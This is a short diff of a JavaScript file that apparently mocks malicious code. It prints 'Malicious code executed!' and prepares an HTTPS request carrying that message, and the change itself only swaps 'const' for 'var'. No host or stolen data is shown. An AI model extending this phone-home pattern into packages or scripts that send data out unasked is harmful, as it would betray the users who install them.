@@ -3,7 +3,7 @@
 console.log("Malicious code executed!");
 
 // Import the 'http' module
-const https = require('https');
+var https = require('https');
 
 // Define the data to be sent in the HTTP request
 const data = JSON.stringify({ message: 'Malicious code executed!' });
